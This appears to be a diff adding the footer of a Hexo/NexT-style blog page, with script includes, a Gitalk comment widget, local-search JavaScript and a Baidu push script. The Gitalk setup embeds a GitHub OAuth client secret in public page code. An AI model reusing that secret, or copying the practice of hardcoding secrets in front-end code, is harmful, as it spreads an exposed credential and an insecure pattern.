+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+   
+
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script type="text/javascript">
+        var gitalk = new Gitalk({
+          clientID:  '96531982aa814e82e033', 
+          clientSecret: '9d64fd0a7523408d110bfc9839658aaa2a0ee62e',
+          id: window.location.pathname,
+          repo: 'Blog_Comments', 
+          owner: 'gaoteng17', 
+          admin: 'gaoteng17', 
+          distractionFreeMode: 'true',
+        })
+        gitalk.render('gitalk-container')
+    </script>
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
